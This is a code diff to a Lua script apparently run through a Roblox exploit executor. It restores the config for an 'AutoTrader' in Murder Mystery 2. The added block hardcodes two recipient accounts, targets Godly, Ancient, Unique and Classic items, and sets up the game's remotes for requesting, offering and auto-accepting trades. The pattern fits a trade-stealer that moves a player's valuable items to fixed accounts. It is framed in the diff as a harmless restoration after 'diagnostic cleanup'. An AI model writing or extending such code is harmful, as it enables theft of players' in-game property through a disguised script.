@@ -159,6 +159,61 @@ CreateDiagnosticGui()
 DLog("AutoTrader file reached.")
 
 --============================================================
+-- SERVICES / CONFIG / TRADE REMOTES
+-- Restored after diagnostic cleanup accidentally removed this block.
+--============================================================
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local MM2 =
+	(getgenv and getgenv().MM2_V85_SPLIT)
+	or _G.MM2_V85_SPLIT
+
+local APPROVED_TARGETS = {
+	{ Username = "umpireblue", UserId = 2907093655 },
+	{ Username = "gamermusaXD_YT", UserId = 7869666469 },
+}
+
+local PRIMARY_RARITIES = {
+	Unique = true,
+	Ancient = true,
+	Godly = true,
+	Classic = true,
+}
+
+local FILLER_RARITIES = {
+	Legendary = true,
+}
+
+local MAX_ITEMS_PER_TRADE = 4
+local AUTO_ACCEPT_DELAY = 5.1
+local REQUEST_TIMEOUT = 12
+local OFFER_TIMEOUT = 12
+local RESCAN_DELAY = 1
+local BACKGROUND_SCAN_INTERVAL = 2
+
+local InventoryModule =
+	require(
+		ReplicatedStorage
+			:WaitForChild("Modules")
+			:WaitForChild("InventoryModule")
+	)
+
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local SendRequest = Trade:WaitForChild("SendRequest")
+local StartTrade = Trade:WaitForChild("StartTrade")
+local OfferItem = Trade:WaitForChild("OfferItem")
+local UpdateTrade = Trade:WaitForChild("UpdateTrade")
+local AcceptTrade = Trade:WaitForChild("AcceptTrade")
+local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
+
+DLog("RESTORED: services/config/trade remotes initialized.")
+
+--============================================================
 -- GLOBAL STATE
 --============================================================
 
